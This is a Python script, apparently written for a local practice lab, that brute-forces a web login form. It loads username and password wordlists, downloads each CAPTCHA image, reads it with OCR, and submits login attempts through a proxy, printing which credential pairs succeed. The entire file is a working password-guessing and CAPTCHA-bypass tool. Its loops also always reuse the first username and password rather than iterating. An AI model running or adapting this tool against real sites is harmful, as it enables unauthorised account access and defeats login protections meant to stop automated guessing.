import re
import requests
import pytesseract
from PIL import Image
import threading

bad = '\033[91m[-]\033[0m'
good = '\033[32m[+]\033[0m'

headers={
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
'Cookie': 'PHPSESSID=7f89a6ncn5glr2j1tc4hh1rmq4',
'Connection': 'close'}
#验证码识别
def code_brute(url):
    r=requests.get(url,headers=headers,proxies={'http':'http://127.0.0.1:8080'})
    data=r.content.decode()
    code=re.findall("src=\"(.*)\" wid",data)  #匹配验证码
    code_url="".join(code)
    action=re.findall("action=\"(.*)\" method",data)  #匹配登录处理地址
    action_url="".join(action)
    baseurl="http://127.0.0.1/baji/login/"
    code_addr=baseurl+code_url
    action_addr=baseurl+action_url
    with open("code.jpg","wb") as f:
        code1=requests.get(code_addr,proxies={'http':'http://127.0.0.1:8080'})
        f.write(code1.content)
    name="code.jpg"
    image=Image.open(name)
    code3=pytesseract.image_to_string(image)
    code3="".join(code3.split())
    return action_addr,code3
#用户名字典
def userlist():
    users=[]
    with open(r'files\user.txt','r') as f:
        users=f.readlines()
        return users
#密码字典
def pwdlist():
    pwd=[]
    with open(r'files\password.txt','r') as f:
        pwd=f.readlines()
        return pwd
#暴力破解
def brute(url):
    url=url
    users=userlist()
    passwords=pwdlist()
    for i in range(len(users)):
        for j in range(len(passwords)):
            p_url,code=code_brute(url)
            data={'username':users[0].strip(),'password':passwords[0].strip(),'imgcode':code.strip(),'button':'%E7%99%BB%E5%BD%95'}
            r=requests.post(p_url,data=data,headers=headers,proxies={'http':'http://127.0.0.1:8080'})
            content=r.content
            text=r.text
            print(text)
            if b'success' in content:
                print("%s " % good +users[0].strip()+'\t'+passwords[0].strip()+'\t'+code+'\t'+'\033[91mTrue\033[0m')
            else:
                print("%s " % bad +users[0].strip()+'\t'+passwords[0].strip()+'\t'+code+'\t'+'False')
def main():
    url = "http://127.0.0.1/baji/login/login2.html"
    brute(url)
if __name__ == '__main__':
    main()